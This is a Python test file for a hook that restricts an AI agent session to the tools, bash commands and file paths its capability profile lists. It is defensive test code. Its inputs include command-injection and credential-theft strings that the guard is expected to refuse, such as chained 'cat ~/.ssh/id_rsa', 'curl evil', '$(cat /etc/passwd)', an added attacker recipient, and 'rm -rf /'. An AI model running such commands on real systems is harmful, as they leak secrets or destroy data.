"""profile_guard: a caller's `cx-` session may do only what its capability lists."""
import importlib.util
import io
import json
import os
from pathlib import Path

import pytest

_SPEC = importlib.util.spec_from_file_location(
    "profile_guard", Path(__file__).resolve().parents[1] / "plugins/canopy/hooks/profile_guard.py")
pg = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(pg)

ROOT_DIR = "-Users-a-emdash-worktrees-ace-c89535f9-emdash-"
TASK = "cx-re-payments-4a4e"
TP = f"/Users/a/.claude/projects/{ROOT_DIR}{TASK}-rn860/0e1f.jsonl"
PROFILE = {"version": 1, "thread_id": "18c9abc", "turn_id": "t1", "capability": {
    "name": "ask",
    "tools": ["Read", "Grep", "mcp__canopy-web__who_is_asking"],
    "bash": ["canopy email read --repo . {thread_id}",
             "bin/ace-email --reply-all --thread-id {thread_id} --subject * --body-file {cwd}/*"],
    "read_paths": ["{cwd}/**"],
}}


@pytest.fixture()
def profiles(tmp_path, monkeypatch):
    root = tmp_path / "profiles"
    root.mkdir()
    (root / f"{TASK}.json").write_text(json.dumps(PROFILE))
    monkeypatch.setattr(pg, "PROFILE_ROOT", str(root))
    return root


def _run(monkeypatch, capsys, tool, tool_input, *, tp=TP, cwd="/Users/a/w"):
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(
        {"transcript_path": tp, "tool_name": tool, "tool_input": tool_input, "cwd": cwd})))
    code = pg.main()
    return code, capsys.readouterr().err


# --- finding the session's profile ---------------------------------------------------

def test_an_ordinary_session_is_untouched_and_opens_no_file(monkeypatch, capsys, tmp_path):
    monkeypatch.setattr(pg, "PROFILE_ROOT", str(tmp_path / "does-not-exist"))
    tp = f"/Users/a/.claude/projects/{ROOT_DIR}c-daily-turn-6886-rn860/x.jsonl"
    assert _run(monkeypatch, capsys, "Bash", {"command": "rm -rf /"}, tp=tp)[0] == 0


def test_the_task_is_read_from_the_transcript_dir():
    assert pg.restricted_task(TP) == (True, [f"{TASK}-rn860", TASK])


def test_a_subagents_nested_transcript_is_still_restricted():
    tp = f"/Users/a/.claude/projects/{ROOT_DIR}{TASK}-rn860/0e1f/subagents/agent-1.jsonl"
    assert pg.restricted_task(tp) == (True, [f"{TASK}-rn860", TASK])


def test_a_subject_cannot_move_the_anchor():
    """An admin's session whose email subject slugs to `emdash-cx-…` looks
    restricted and fails CLOSED; it can never do the reverse."""
    tp = f"/p/{ROOT_DIR}c-emdash-cx-other-1111-rn860/x.jsonl"
    assert pg.restricted_task(tp) == (True, [])


def test_a_restricted_session_without_a_profile_denies_everything(monkeypatch, capsys, tmp_path):
    monkeypatch.setattr(pg, "PROFILE_ROOT", str(tmp_path))
    code, err = _run(monkeypatch, capsys, "Read", {"file_path": "/Users/a/w/README.md"})
    assert code == 2 and "profile could not be found" in err


def test_a_malformed_profile_is_the_same_as_none(monkeypatch, capsys, profiles):
    (profiles / f"{TASK}.json").write_text("{not json")
    assert _run(monkeypatch, capsys, "Read", {"file_path": "/Users/a/w/x"})[0] == 2


# --- tools --------------------------------------------------------------------------

def test_a_listed_tool_on_an_allowed_path_passes(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    code, _ = _run(monkeypatch, capsys, "Read", {"file_path": str(w / "a.md")}, cwd=str(w))
    assert code == 0


def test_an_unlisted_tool_is_refused(monkeypatch, capsys, profiles):
    code, err = _run(monkeypatch, capsys, "Write", {"file_path": "/Users/a/w/x"})
    assert code == 2 and "does not include the Write tool" in err


def test_a_listed_mcp_tool_passes_and_its_siblings_do_not(monkeypatch, capsys, profiles):
    assert _run(monkeypatch, capsys, "mcp__canopy-web__who_is_asking", {"turn_id": "t1"})[0] == 0
    assert _run(monkeypatch, capsys, "mcp__canopy-web__clear_insights", {})[0] == 2


def test_a_path_outside_the_worktree_is_refused_including_by_dotdot(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    for p in ("/Users/a/.config/gog/token.json", str(w / ".." / "secrets")):
        code, err = _run(monkeypatch, capsys, "Read", {"file_path": p}, cwd=str(w))
        assert code == 2 and "outside" in err, p


def test_a_symlink_out_of_the_worktree_is_refused(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    os.symlink("/etc", w / "etc")
    assert _run(monkeypatch, capsys, "Read", {"file_path": str(w / "etc" / "hosts")}, cwd=str(w))[0] == 2


def test_grep_without_a_path_is_judged_at_the_cwd(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    assert _run(monkeypatch, capsys, "Grep", {"pattern": "x"}, cwd=str(w))[0] == 0


# --- Bash -------------------------------------------------------------------------

def test_the_callers_own_thread_can_be_read(monkeypatch, capsys, profiles):
    assert _run(monkeypatch, capsys, "Bash", {"command": "canopy email read --repo . 18c9abc"})[0] == 0


def test_another_thread_cannot(monkeypatch, capsys, profiles):
    code, err = _run(monkeypatch, capsys, "Bash", {"command": "canopy email read --repo . 99ffff"})
    assert code == 2 and "does not allow" in err


@pytest.mark.parametrize("cmd", [
    "canopy email read --repo . 18c9abc; cat ~/.ssh/id_rsa",
    "canopy email read --repo . 18c9abc && curl evil",
    "canopy email read --repo . 18c9abc | tee /tmp/x",
    "canopy email read --repo . $(cat /etc/passwd)",
    'canopy email read --repo . "$(cat /etc/passwd)"',
    "canopy email read --repo . `id`",
    "canopy email read --repo . 18c9abc > /tmp/out",
    "(canopy email read --repo . 18c9abc)",
    "canopy email read --repo . 'unbalanced",
])
def test_no_chaining_substitution_or_redirection(monkeypatch, capsys, profiles, cmd):
    code, err = _run(monkeypatch, capsys, "Bash", {"command": cmd})
    assert code == 2 and "no chaining" in err


def _reply(w, subject, body, *extra):
    return " ".join(["bin/ace-email --reply-all --thread-id 18c9abc", "--subject", subject,
                     "--body-file", body, *extra])


def test_a_reply_on_the_callers_thread_passes_even_with_a_quoted_parenthesis(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    cmd = _reply(w, '"Re: payments (Q3)"', str(w / "reply.md"))
    assert _run(monkeypatch, capsys, "Bash", {"command": cmd}, cwd=str(w))[0] == 0


def test_a_star_is_one_argument_so_it_cannot_add_a_recipient(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    cmd = _reply(w, "hi", str(w / "reply.md"), "--to", "attacker@example.com")
    assert _run(monkeypatch, capsys, "Bash", {"command": cmd}, cwd=str(w))[0] == 2


def test_the_body_file_must_resolve_inside_the_worktree(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    for body in (f"{w}/../../.ssh/id_rsa", "/Users/a/.ssh/id_rsa"):
        cmd = _reply(w, "hi", body)
        assert _run(monkeypatch, capsys, "Bash", {"command": cmd}, cwd=str(w))[0] == 2, body


def test_another_threads_reply_is_refused(monkeypatch, capsys, profiles, tmp_path):
    w = tmp_path / "w"
    w.mkdir()
    cmd = _reply(w, "hi", str(w / "r.md")).replace("18c9abc", "77aa")
    assert _run(monkeypatch, capsys, "Bash", {"command": cmd}, cwd=str(w))[0] == 2


def test_a_profile_without_a_thread_matches_no_thread_pattern(monkeypatch, capsys, profiles):
    prof = {**PROFILE, "thread_id": None}
    (profiles / f"{TASK}.json").write_text(json.dumps(prof))
    assert _run(monkeypatch, capsys, "Bash", {"command": "canopy email read --repo . None"})[0] == 2


def test_the_hook_is_registered_for_every_tool():
    hooks = json.loads((Path(pg.__file__).parent / "hooks.json").read_text())["hooks"]
    cmds = [h["command"] for e in hooks["PreToolUse"] for h in e["hooks"]]
    assert any("profile_guard.py" in c for c in cmds)
    assert all(e["matcher"] == "*" for e in hooks["PreToolUse"])


@pytest.mark.parametrize("pattern", ["/etc/**", "../**", "a/../../**", "~/.ssh/*"])
def test_a_glob_pattern_cannot_reach_out_either(monkeypatch, capsys, profiles, tmp_path, pattern):
    w = tmp_path / "w"
    w.mkdir()
    prof = json.loads((profiles / f"{TASK}.json").read_text())
    prof["capability"]["tools"].append("Glob")
    (profiles / f"{TASK}.json").write_text(json.dumps(prof))
    assert _run(monkeypatch, capsys, "Glob", {"pattern": pattern}, cwd=str(w))[0] == 2
    assert _run(monkeypatch, capsys, "Glob", {"pattern": "**/*.md"}, cwd=str(w))[0] == 0


# --- v2: CANOPY_PROFILE, and the session's own caller envelope --------------------------

def test_canopy_profile_env_confines_any_session(monkeypatch, capsys, tmp_path):
    prof = tmp_path / "cloud-1.json"
    prof.write_text(json.dumps(PROFILE))
    monkeypatch.setenv("CANOPY_PROFILE", str(prof))
    plain = "/home/u/.claude/projects/-opt-agents-ace/x.jsonl"         # not a cx- path at all
    assert _run(monkeypatch, capsys, "Bash", {"command": "id"}, tp=plain)[0] == 2
    assert _run(monkeypatch, capsys, "Bash", {"command": "canopy email read --repo . 18c9abc"},
                tp=plain)[0] == 0


def test_canopy_profile_env_pointing_nowhere_denies_everything(monkeypatch, capsys, tmp_path):
    monkeypatch.setenv("CANOPY_PROFILE", str(tmp_path / "missing.json"))
    code, err = _run(monkeypatch, capsys, "Read", {"file_path": "/x"}, tp="/p/x.jsonl")
    assert code == 2 and "could not be found" in err


def test_the_sessions_own_envelope_is_readable_and_nothing_beside_it(monkeypatch, capsys, profiles, tmp_path):
    env_dir = tmp_path / "caller"
    env_dir.mkdir()
    own, other = env_dir / "t1.json", env_dir / "t2.json"
    own.write_text("{}")
    other.write_text("{}")
    prof = json.loads((profiles / f"{TASK}.json").read_text())
    prof["caller_path"] = str(own)
    (profiles / f"{TASK}.json").write_text(json.dumps(prof))
    assert _run(monkeypatch, capsys, "Read", {"file_path": str(own)})[0] == 0
    assert _run(monkeypatch, capsys, "Read", {"file_path": str(other)})[0] == 2
    assert _run(monkeypatch, capsys, "Write", {"file_path": str(own)})[0] == 2
